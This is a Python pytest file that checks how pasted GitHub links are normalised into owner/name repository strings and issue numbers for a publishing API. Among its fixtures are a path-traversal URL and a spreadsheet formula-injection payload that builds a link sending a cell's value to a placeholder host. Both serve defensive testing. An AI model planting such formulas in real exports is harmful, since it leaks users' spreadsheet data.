"""Reading a repository out of what a publisher pasted.

A link and an `owner/name` name the same repository, and GitHub reports the second,
so a pasted link has to arrive as the second. These cover the shapes a browser hands
over, and the ones that must be refused rather than stored as a repository that
cannot exist.
"""

from __future__ import annotations

import pytest

from misthos.domain.repo import normalize_repo, parse_repo_link
from misthos.schemas import PublishRequest


@pytest.mark.parametrize(
    "pasted",
    [
        "acme/ledger",
        "acme/ledger/",
        "acme/ledger.git",
        "github.com/acme/ledger",
        "www.github.com/acme/ledger",
        "https://github.com/acme/ledger",
        "http://github.com/acme/ledger",
        "https://github.com/acme/ledger/",
        "https://github.com/acme/ledger.git",
        "https://github.com/acme/ledger/tree/main",
        "https://github.com/acme/ledger/blob/main/src/ledger.py",
        "git@github.com:acme/ledger.git",
        "  https://github.com/acme/ledger  ",
        "https://github.com/acme/ledger/issues/12",
        "https://github.com/acme/ledger/pull/7",
    ],
)
def test_the_same_repository_however_it_arrives(pasted: str) -> None:
    assert normalize_repo(pasted) == "acme/ledger"


@pytest.mark.parametrize(
    "pasted,expected",
    [
        ("https://github.com/acme/ledger/issues/12", 12),
        ("https://github.com/acme/ledger/pull/7", 7),
        ("https://github.com/acme/ledger/pull/7/files", 7),
        # A branch, a file, or the repository itself carries no number.
        ("https://github.com/acme/ledger", None),
        ("https://github.com/acme/ledger/tree/main", None),
        ("acme/ledger", None),
    ],
)
def test_a_link_carries_its_issue_number(pasted: str, expected: int | None) -> None:
    assert parse_repo_link(pasted)[1] == expected


@pytest.mark.parametrize(
    "pasted",
    [
        "",
        "   ",
        "acme",  # an owner alone names no repository
        "ledger.git",
        "https://github.com/acme",  # a profile, not a repository
        "https://gist.github.com/user/1234",  # right host, not a repository URL
        "https://gitlab.com/acme/ledger",  # another host
        "https://github.com/acme/../etc",  # a traversal, not a repository
        "acme/",
    ],
)
def test_something_that_names_no_repository_is_refused(pasted: str) -> None:
    assert normalize_repo(pasted) == ""
    assert parse_repo_link(pasted) == ("", None)


def test_a_name_and_an_owner_are_kept_as_written() -> None:
    """GitHub compares case-insensitively, so the case a publisher used is kept."""
    assert normalize_repo("https://github.com/Acme/Ledger") == "Acme/Ledger"


class TestPublishRequest:
    """How the API body reads what a publisher pasted."""

    def request(self, repo: str, **overrides: object) -> PublishRequest:
        return PublishRequest(
            repo=repo, title="Pin the parser", publisher_id="PUB-1", **overrides
        )

    @pytest.mark.parametrize(
        "pasted",
        ["acme/ledger", "https://github.com/acme/ledger", "git@github.com:acme/ledger.git"],
    )
    def test_a_link_becomes_the_name_the_app_matches(self, pasted: str) -> None:
        assert self.request(pasted).repo == "acme/ledger"

    def test_a_link_fills_in_the_issue_number_it_carries(self) -> None:
        request = self.request("https://github.com/acme/ledger/issues/12")
        assert (request.repo, request.number) == ("acme/ledger", 12)

    def test_a_number_typed_beside_the_link_wins(self) -> None:
        request = self.request("https://github.com/acme/ledger/issues/12", number=99)
        assert request.number == 99

    @pytest.mark.parametrize(
        "typed",
        ['+evil/repo', '=HYPERLINK("http://x/?"&A1,"click")', "acme", ""],
    )
    def test_anything_else_is_kept_exactly_as_the_publisher_wrote_it(
        self, typed: str
    ) -> None:
        """The repository is their own words. The CSV export is what makes them safe
        to open in a spreadsheet, so this field must not start rewriting or refusing
        them — see tests/integration/test_compliance_at_payout.py."""
        assert self.request(typed).repo == typed
